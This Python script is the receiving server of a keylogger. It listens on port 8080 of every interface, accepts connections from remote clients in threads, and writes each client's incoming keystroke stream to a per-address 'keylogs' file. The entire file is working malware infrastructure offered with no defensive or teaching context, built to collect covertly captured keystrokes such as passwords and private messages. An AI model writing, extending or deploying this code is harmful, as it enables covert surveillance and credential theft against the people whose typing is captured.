import socket
import threading
from threading import Event
import time


def print_waitmsg(wait_msg, stop_event: Event):
    wait_msgs = [
        f"{wait_msg}   ",
        f"{wait_msg}.   ",
        f"{wait_msg}..   ",
        f"{wait_msg}...   "
    ]
    while not stop_event.is_set():
        for msg in wait_msgs:
            print(msg, end='\r', flush=True)
            time.sleep(0.3)


def handle_client(conn: socket, addr, stop_event: Event):
    print("Got connection from ", addr)
    file = open(f"keylogs_{addr}.txt", "w")
    conn.settimeout(1)
    while not stop_event.is_set():
        try:
            key = conn.recv(1024).decode()
            if len(key)==0:
                print("")
                print("Client must have disconnected.")
                file.close()
                break
            # print(key, end="", flush=True)
            file.write(key)
            file.flush()
        except socket.timeout:
            continue
        except :
            print("")
            print("Client must have disconnected.")
            file.close()
            break



if __name__ == "__main__":
    stop_event = threading.Event()
    s = socket.socket()
    print("")
    print("Socket created.")
    s.settimeout(1)
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")
    s.listen(5)
    try:
        waitmsg_thread = threading.Thread(target=print_waitmsg, args=("Socket is listening", stop_event))
        waitmsg_thread.start()
        while s and not stop_event.is_set():
            try:
                connection, address = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(connection, address, stop_event))
                client_thread.start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        stop_event.set()
        print("")
        print("Closing socket...")
        s.close()
        print("Closing server...")
        print("")
        exit()       


